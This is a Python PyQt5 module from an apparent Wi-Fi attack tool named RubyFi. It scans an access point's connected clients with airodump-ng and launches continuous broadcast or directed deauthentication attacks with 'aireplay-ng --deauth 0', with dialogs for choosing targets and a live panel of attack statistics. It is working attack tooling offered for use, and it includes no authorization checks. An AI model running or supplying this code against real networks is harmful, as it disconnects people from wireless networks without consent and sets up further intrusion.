#!/usr/bin/env python3
"""gui/deauth_dialog.py — All Deauth-related threads, dialogs, and RubyFiWindow methods."""

import re
import subprocess
import tempfile
import time
import os
from typing import Optional

from PyQt5.QtWidgets import (
    QDialog, QVBoxLayout, QHBoxLayout, QPushButton, QLabel,
    QTableWidget, QTableWidgetItem, QHeaderView, QWidget,
    QProgressBar, QTextEdit, QMessageBox
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QColor, QBrush


# ═══════════════════════════════════════════════════════════════
# THREADS
# ═══════════════════════════════════════════════════════════════

class ClientScanThread(QThread):
    """Background thread for scanning connected clients."""
    client_found = pyqtSignal(dict)
    scan_complete = pyqtSignal(int)
    progress_update = pyqtSignal(str)

    def __init__(self, interface, bssid, channel):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.channel = channel
        self.running = True

    def run(self):
        try:
            subprocess.run(
                ["iwconfig", self.interface, "channel", str(self.channel)],
                capture_output=True
            )
            self.progress_update.emit("🔍 Scanning for clients...")

            temp_dir = tempfile.mkdtemp()
            output_file = os.path.join(temp_dir, "clients")

            cmd = [
                'airodump-ng',
                '--bssid', self.bssid,
                '--channel', str(self.channel),
                '--output-format', 'csv',
                '--write', output_file,
                self.interface
            ]

            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            csv_file = f"{output_file}-01.csv"
            clients_found = {}

            for i in range(30):
                if not self.running:
                    break
                time.sleep(1)
                self.progress_update.emit(f"⏳ Scanning... {i+1}s | Found: {len(clients_found)}")
                if os.path.exists(csv_file) and os.path.getsize(csv_file) > 50:
                    clients = self._parse_clients(csv_file)
                    for client in clients:
                        mac = client['Station MAC']
                        if mac not in clients_found:
                            clients_found[mac] = client
                            self.client_found.emit(client)

            proc.terminate()
            proc.wait()
            os.system(f"rm -rf {temp_dir}")
            self.scan_complete.emit(len(clients_found))

        except Exception as e:
            self.progress_update.emit(f"❌ Error: {str(e)}")
            self.scan_complete.emit(0)

    def _parse_clients(self, csv_file):
        clients = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()
            station_start = -1
            for i, line in enumerate(lines):
                if 'Station MAC' in line:
                    station_start = i + 1
                    break
            if station_start == -1:
                return []
            for line in lines[station_start:]:
                if not line.strip():
                    continue
                parts = [p.strip() for p in line.split(',')]
                if len(parts) < 6:
                    continue
                station_mac = parts[0].strip()
                bssid = parts[5].strip()
                if station_mac and ':' in station_mac and bssid == self.bssid:
                    clients.append({
                        'Station MAC': station_mac,
                        'Power': parts[3].strip() or 'N/A',
                        '# packets': parts[4].strip() or '0'
                    })
        except Exception:
            pass
        return clients

    def stop(self):
        self.running = False


class DeauthThread(QThread):
    """Background thread for deauth attack."""
    status_update = pyqtSignal(str)
    attack_complete = pyqtSignal(bool, str)

    def __init__(self, interface, bssid, ssid, channel, client_mac=None):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.client_mac = client_mac
        self.running = True
        self.process = None

    def run(self):
        try:
            self.status_update.emit(f"🔧 Setting interface to channel {self.channel}...")
            subprocess.run(
                ["iwconfig", self.interface, "channel", str(self.channel)],
                capture_output=True
            )
            time.sleep(0.5)

            attack_type = "Directed" if self.client_mac else "Broadcast"
            self.status_update.emit(f"⚡ Starting {attack_type} deauth attack...")

            cmd = ["aireplay-ng", "--deauth", "0", "-a", self.bssid]
            if self.client_mac:
                cmd.extend(["-c", self.client_mac])
            cmd.append(self.interface)

            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )

            self.status_update.emit("✅ Deauth attack running... (Click 'Stop Attack' to end)")

            packet_count = 0
            start_time = time.time()

            while self.running and self.process.poll() is None:
                try:
                    line = self.process.stdout.readline()
                    if not line:
                        break
                    if "ACKs" in line or "acks" in line.lower():
                        numbers = re.findall(r'\d+', line)
                        if numbers:
                            packet_count = int(numbers[0])
                            elapsed = int(time.time() - start_time)
                            rate = packet_count / elapsed if elapsed > 0 else 0
                            self.status_update.emit(
                                f"⚡ Packets: {packet_count} | Time: {elapsed}s | Rate: {rate:.1f}/s"
                            )
                except Exception:
                    pass

            if self.process and self.process.poll() is None:
                self.process.terminate()
                self.process.wait(timeout=2)

            elapsed = int(time.time() - start_time)
            self.attack_complete.emit(True, f"Attack stopped - {packet_count} packets sent in {elapsed}s")

        except Exception as e:
            self.attack_complete.emit(False, str(e))
        finally:
            subprocess.run("pkill aireplay-ng", shell=True, stderr=subprocess.DEVNULL)

    def stop(self):
        self.running = False
        if self.process and self.process.poll() is None:
            self.process.terminate()


# ═══════════════════════════════════════════════════════════════
# DIALOGS
# ═══════════════════════════════════════════════════════════════

class ClientSelectionDialog(QDialog):
    """Dialog to select a client for directed deauth."""

    def __init__(self, bssid: str, ssid: str, channel: str, interface: str, parent=None):
        super().__init__(parent)
        self.setWindowTitle("⚡ Select Client for Directed Deauth")
        self.setModal(True)
        self.setMinimumSize(600, 400)
        self.selected_client = None
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.interface = interface
        self.clients = []
        self.scan_thread = None
        self.init_ui()
        self.start_scanning()

    def init_ui(self):
        layout = QVBoxLayout(self)

        header = QLabel("⚡ CONNECTED CLIENTS")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet("font-size: 16px; font-weight: bold; color: #ff006e; margin: 10px;")
        layout.addWidget(header)

        self.status_label = QLabel("🔍 Scanning for clients...")
        self.status_label.setStyleSheet("color: #00ff88; margin: 10px; font-weight: bold;")
        layout.addWidget(self.status_label)

        self.client_table = QTableWidget()
        self.client_table.setColumnCount(3)
        self.client_table.setHorizontalHeaderLabels(["MAC Address", "Power (dBm)", "Packets"])

        header_view = self.client_table.horizontalHeader()
        header_view.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        header_view.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        header_view.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)

        self.client_table.verticalHeader().setVisible(False)
        self.client_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.client_table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
        self.client_table.setStyleSheet("""
QTableWidget {
    background: #0d1117;
    border: 1px solid #30363d;
    color: #c9d1d9;
    gridline-color: #30363d;
}
QHeaderView::section {
    background: #161b22;
    color: #00ff88;
    border: 1px solid #30363d;
    padding: 8px;
    font-weight: bold;
}
QTableWidget::item { padding: 5px; }
QTableWidget::item:selected { background: #1f6feb; }
""")
        layout.addWidget(self.client_table)

        btn_layout = QHBoxLayout()

        self.stop_scan_btn = QPushButton("⏹️ Stop Scanning")
        self.stop_scan_btn.setStyleSheet("""
QPushButton { background:#21262d; border:2px solid #ffbe0b; color:#ffbe0b; padding:10px; border-radius:6px; font-weight:bold; }
QPushButton:hover { background:#ffbe0b; color:#0d1117; }
""")
        self.stop_scan_btn.clicked.connect(self.stop_scanning)
        btn_layout.addWidget(self.stop_scan_btn)

        select_btn = QPushButton("✓ Select")
        select_btn.setStyleSheet("""
QPushButton { background:#21262d; border:2px solid #00ff88; color:#00ff88; padding:10px; border-radius:6px; font-weight:bold; }
QPushButton:hover { background:#00ff88; color:#0d1117; }
""")
        select_btn.clicked.connect(self.accept)

        broadcast_btn = QPushButton("📢 Use Broadcast")
        broadcast_btn.setStyleSheet("""
QPushButton { background:#21262d; border:2px solid #8338ec; color:#8338ec; padding:10px; border-radius:6px; font-weight:bold; }
QPushButton:hover { background:#8338ec; color:#0d1117; }
""")
        broadcast_btn.clicked.connect(self.use_broadcast)

        cancel_btn = QPushButton("✗ Cancel")
        cancel_btn.setStyleSheet("""
QPushButton { background:#21262d; border:2px solid #8b949e; color:#8b949e; padding:10px; border-radius:6px; }
QPushButton:hover { background:#8b949e; color:#0d1117; }
""")
        cancel_btn.clicked.connect(self.reject)

        btn_layout.addWidget(select_btn)
        btn_layout.addWidget(broadcast_btn)
        btn_layout.addWidget(cancel_btn)
        layout.addLayout(btn_layout)

    def stop_scanning(self):
        if self.scan_thread and self.scan_thread.isRunning():
            self.status_label.setText("🛑 Stopping scan...")
            self.scan_thread.stop()
            self.scan_thread.wait()
            self.on_scan_complete(len(self.clients))
            self.stop_scan_btn.setVisible(False)

    def get_selected_client(self) -> Optional[str]:
        selected = self.client_table.selectedItems()
        if selected:
            row = selected[0].row()
            return self.clients[row]['Station MAC']
        return None

    def start_scanning(self):
        self.scan_thread = ClientScanThread(self.interface, self.bssid, int(self.channel))
        self.scan_thread.client_found.connect(self.on_client_found)
        self.scan_thread.scan_complete.connect(self.on_scan_complete)
        self.scan_thread.progress_update.connect(lambda msg: self.status_label.setText(msg))
        self.scan_thread.start()

    def on_client_found(self, client):
        row = self.client_table.rowCount()
        self.client_table.insertRow(row)

        mac_item = QTableWidgetItem(client['Station MAC'])
        mac_item.setForeground(QBrush(QColor(0, 255, 136)))
        self.client_table.setItem(row, 0, mac_item)

        pwr_item = QTableWidgetItem(client['Power'])
        pwr_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        pwr_item.setForeground(QBrush(QColor(255, 190, 11)))
        self.client_table.setItem(row, 1, pwr_item)

        pkt_item = QTableWidgetItem(client['# packets'])
        pkt_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
        pkt_item.setForeground(QBrush(QColor(201, 209, 217)))
        self.client_table.setItem(row, 2, pkt_item)

        self.clients.append(client)

    def on_scan_complete(self, count):
        if count == 0:
            self.status_label.setText("❌ No clients found")
        else:
            self.status_label.setText(f"✅ Found {count} client(s)")
        if hasattr(self, 'stop_scan_btn'):
            self.stop_scan_btn.setVisible(False)

    def use_broadcast(self):
        self.selected_client = None
        self.accept()


class DeauthDialog(QDialog):
    """Dialog to select deauth attack type."""

    def __init__(self, target_ssid: str, target_bssid: str, target_channel: str, interface: str, parent=None):
        super().__init__(parent)
        self.setWindowTitle("⚡ Deauthentication Attack")
        self.setModal(True)
        self.setMinimumSize(500, 300)
        self.target_ssid = target_ssid
        self.target_bssid = target_bssid
        self.target_channel = target_channel
        self.interface = interface
        self.selected_attack = None
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout(self)

        header = QLabel("⚡ DEAUTHENTICATION ATTACK")
        header.setAlignment(Qt.AlignmentFlag.AlignCenter)
        header.setStyleSheet("font-size: 16px; font-weight: bold; color: #ff006e; margin: 15px;")
        layout.addWidget(header)

        info_text = f"Target: {self.target_ssid}\nBSSID: {self.target_bssid}\nChannel: {self.target_channel}"
        info_label = QLabel(info_text)
        info_label.setStyleSheet(
            "color: #c9d1d9; margin: 10px; padding: 10px; background: #161b22; border-radius: 6px;"
        )
        layout.addWidget(info_label)

        attacks = [
            ("🎯 Broadcast Deauth (All Clients)", "broadcast", "#ffbe0b"),
            ("📍 Directed Deauth (Specific Client)", "directed", "#ff006e"),
        ]

        for text, attack_id, color in attacks:
            btn = QPushButton(text)
            btn.setMinimumHeight(50)
            btn.setStyleSheet(f"""
QPushButton {{
    background: #21262d; border: 2px solid {color}; color: {color};
    font-size: 13px; font-weight: bold; text-align: left;
    padding-left: 20px; border-radius: 6px;
}}
QPushButton:hover {{ background: {color}; color: #0d1117; }}
""")
            btn.clicked.connect(lambda checked, aid=attack_id: self.select_attack(aid))
            layout.addWidget(btn)

        layout.addStretch()

        cancel_btn = QPushButton("❌ Cancel")
        cancel_btn.clicked.connect(self.reject)
        cancel_btn.setStyleSheet("""
QPushButton { background:#161b22; border:2px solid #8b949e; color:#8b949e; padding:10px; border-radius:6px; }
QPushButton:hover { background:#8b949e; color:#0d1117; }
""")
        layout.addWidget(cancel_btn)
        self.setLayout(layout)

    def select_attack(self, attack_id):
        self.selected_attack = attack_id
        self.accept()


# ═══════════════════════════════════════════════════════════════
# MIXIN — inject these into RubyFiWindow via inheritance
# ═══════════════════════════════════════════════════════════════

class DeauthMixin:
    """
    All deauth-related RubyFiWindow methods.
    RubyFiWindow must inherit from this alongside QMainWindow.
    Requires self.log(), self.current_interface, self.selected_target,
    self.centralWidget() from RubyFiWindow.
    """

    # ── entry point ──────────────────────────────────────────────
    def execute_deauth(self):
        target = self.selected_target

        dialog = DeauthDialog(
            target['ssid'], target['bssid'], target['channel'],
            self.current_interface, self
        )
        if dialog.exec() != QDialog.DialogCode.Accepted:
            return

        attack_type = dialog.selected_attack
        if attack_type == "broadcast":
            self.perform_broadcast_deauth(target)
        elif attack_type == "directed":
            self.log("🔍 Scanning for connected clients...")
            self.perform_directed_deauth(target)

    # ── broadcast ────────────────────────────────────────────────
    def perform_broadcast_deauth(self, target):
        self.log(f"🎯 Launching BROADCAST deauth on {target['ssid']}...")
        self.log(f"   BSSID: {target['bssid']}")
        self.log(f"   Channel: {target['channel']}")

        try:
            self.deauth_thread = DeauthThread(
                self.current_interface,
                target['bssid'], target['ssid'], int(target['channel']),
                client_mac=None
            )
            self.deauth_thread.status_update.connect(self.update_attack_stats)
            self.deauth_thread.attack_complete.connect(self.on_deauth_complete)
            self.deauth_thread.start()
            self.show_stop_attack_button()
        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", str(e))

    # ── directed ─────────────────────────────────────────────────
    def perform_directed_deauth(self, target):
        self.log(f"🎯 Launching DIRECTED deauth on {target['ssid']}...")
        self.log(f"   BSSID: {target['bssid']}")
        self.log(f"   Channel: {target['channel']}")
        self.log("   Scanning for connected clients...")

        try:
            client_dialog = ClientSelectionDialog(
                target['bssid'], target['ssid'], target['channel'],
                self.current_interface, self
            )
            if client_dialog.exec() != QDialog.DialogCode.Accepted:
                self.log("❌ Directed deauth cancelled")
                return

            selected_client = client_dialog.get_selected_client()

            if selected_client:
                self.log(f"   📍 Selected Client: {selected_client}")
            else:
                self.log("   📢 No client selected - will use broadcast mode")

            self.deauth_thread = DeauthThread(
                self.current_interface,
                target['bssid'], target['ssid'], int(target['channel']),
                client_mac=selected_client
            )
            self.deauth_thread.status_update.connect(self.update_attack_stats)
            self.deauth_thread.attack_complete.connect(self.on_deauth_complete)
            self.deauth_thread.start()
            self.show_stop_attack_button()

        except Exception as e:
            self.log(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", f"Deauth failed: {str(e)}")

    # ── UI helpers ───────────────────────────────────────────────
    def show_stop_attack_button(self):
        self.stats_panel = self.create_stats_panel()

        self.stop_attack_btn = QPushButton("⏹️ Stop Attack")
        self.stop_attack_btn.setStyleSheet("""
QPushButton { background:#21262d; border:2px solid #ff006e; color:#ff006e; font-weight:bold; padding:10px; border-radius:6px; }
QPushButton:hover { background:#ff006e; color:#0d1117; }
""")
        self.stop_attack_btn.clicked.connect(self.stop_attack)

        layout = self.centralWidget().layout()
        layout.insertWidget(layout.count() - 2, self.stats_panel)
        layout.insertWidget(layout.count() - 2, self.stop_attack_btn)

        self.stats_timer = QTimer()
        self.stats_timer.timeout.connect(self.blink_stats)
        self.stats_timer.start(500)
        self.blink_state = False

    def stop_attack(self):
        if hasattr(self, 'deauth_thread') and self.deauth_thread.isRunning():
            self.log("🛑 Stopping deauth attack...")
            self.deauth_thread.stop()
            self.deauth_thread.wait()
            self.log("✅ Attack stopped successfully")
        self.hide_stop_attack_button()

    def hide_stop_attack_button(self):
        if hasattr(self, 'stats_timer'):
            self.stats_timer.stop()
            del self.stats_timer
        if hasattr(self, 'stats_panel'):
            self.stats_panel.deleteLater()
            del self.stats_panel
        if hasattr(self, 'stop_attack_btn'):
            self.stop_attack_btn.deleteLater()
            del self.stop_attack_btn

    def on_deauth_complete(self, success, message):
        if success:
            self.log(f"✅ {message}")
        else:
            self.log(f"❌ Error: {message}")
        self.hide_stop_attack_button()

    # ── stats panel builder ──────────────────────────────────────
    def create_stats_panel(self):
        panel = QWidget()
        panel.setStyleSheet("""
QWidget { background:#161b22; border:2px solid #ff006e; border-radius:8px; padding:10px; }
""")
        layout = QVBoxLayout(panel)

        title = QLabel("⚡ LIVE ATTACK STATS")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        title.setStyleSheet("color:#ff006e; font-weight:bold; font-size:16px; border:none;")
        layout.addWidget(title)

        stats_layout = QHBoxLayout()

        def _stat_widget(attr, desc_text, color):
            w = QWidget()
            vl = QVBoxLayout(w)
            vl.setContentsMargins(5, 5, 5, 5)
            val = QLabel("0" if "Packet" in desc_text else ("0s" if "Time" in desc_text else "0/s"))
            val.setAlignment(Qt.AlignmentFlag.AlignCenter)
            val.setStyleSheet(f"color:{color}; font-size:28px; font-weight:bold; border:none;")
            desc = QLabel(desc_text)
            desc.setAlignment(Qt.AlignmentFlag.AlignCenter)
            desc.setStyleSheet("color:#8b949e; font-size:11px; border:none;")
            vl.addWidget(val)
            vl.addWidget(desc)
            setattr(self, attr, val)
            return w

        stats_layout.addWidget(_stat_widget("packets_label", "Packets Sent", "#00ff88"))
        stats_layout.addWidget(_stat_widget("time_label",    "Time Elapsed", "#ffbe0b"))
        stats_layout.addWidget(_stat_widget("rate_label",    "Attack Rate",  "#ff006e"))
        layout.addLayout(stats_layout)

        self.attack_progress = QProgressBar()
        self.attack_progress.setRange(0, 0)
        self.attack_progress.setTextVisible(False)
        self.attack_progress.setStyleSheet("""
QProgressBar { border:1px solid #30363d; border-radius:4px; background:#0d1117; height:8px; }
QProgressBar::chunk { background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #ff006e,stop:0.5 #ffbe0b,stop:1 #00ff88); border-radius:4px; }
""")
        layout.addWidget(self.attack_progress)
        return panel

    def update_attack_stats(self, message):
        self.log(message)
        if "Packets:" in message and "|" in message:
            parts = message.split("|")
            packets_match = re.search(r'Packets:\s*(\d+)', parts[0])
            if packets_match:
                self.packets_label.setText(packets_match.group(1))
            if len(parts) > 1:
                time_match = re.search(r'Time:\s*(\d+)s', parts[1])
                if time_match:
                    self.time_label.setText(f"{time_match.group(1)}s")
            if len(parts) > 2:
                rate_match = re.search(r'Rate:\s*([\d.]+)/s', parts[2])
                if rate_match:
                    self.rate_label.setText(f"{rate_match.group(1)}/s")

    def blink_stats(self):
        if hasattr(self, 'packets_label'):
            if self.blink_state:
                self.packets_label.setStyleSheet(
                    "color:#00ff88; font-size:28px; font-weight:bold; border:none;"
                )
            else:
                self.packets_label.setStyleSheet(
                    "color:#00cc66; font-size:28px; font-weight:bold; border:none;"
                )
            self.blink_state = not self.blink_state
